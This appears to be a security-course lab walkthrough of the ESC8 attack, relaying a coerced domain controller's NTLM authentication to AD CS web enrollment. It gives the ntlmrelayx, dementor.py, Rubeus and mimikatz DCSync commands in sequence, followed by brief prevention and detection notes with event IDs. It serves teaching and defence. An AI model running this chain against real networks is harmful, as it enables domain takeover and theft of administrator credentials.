## Description

Another attack we can abuse is relaying to ADCS to obtain a certificate, a technique known as ESC8.
Before, we used PrinterBug and Coercer to force computers to connect to any other computer. This time we will utilize PrinterBug and with the received reverse connection, we will relay to ADCS to obtain a certificate.

## Attack

We begin by configuring NTLMRelayx to forward incoming connections to the HTTP endpoint of our CA. The _--adcs_ switch makes it parse and displays the certificate if one is received.
```shell
impacket-ntlmrelayx -t http://172.16.18.15/certsrv/default.asp --template DomainController -smb2support --adcs
```

Now we need the DC to connect to us, just like before.
```shell
python3 ./dementor.py 172.16.18.20 172.16.18.4 -u bob -d eagle.local -p Slavi123
```

We should see that an incoming request from DC2$ was relayed and we got a certificate. Now we copy the certificate and request a TGT in Windows.
```powershell
.\Rubeus.exe asktgt /user:DC2$ /ptt /certificate:MIIRbQIBAzCCEScGCSqGSI<SNIP>
```

Being a Domain Controller,, we can now trigger DCSync.
```powershell
.\mimikatz.exe "lsadump::dcsync /user:Administrator" exit
```

## Prevention

This attack was possible because:
- We managed to coerce DC2 successfully.
- ADCS web enrollment does not enforce HTTPS (otherwise, relaying would fail and we wouldn't request a certificate).

Scan regularly the environment to find potential issues.

## Detection

Starting from the beginning, when the certificate is requested, we will see that the CA has flagged both the requests and the issuer of the certificate in events ID 4886 and 4887.
Then, we utilized the certificate to obtain a TGT, resulting in event ID 4768.
Finally, when we performed DCSync, we get an event ID 4624 indicating successful logon.
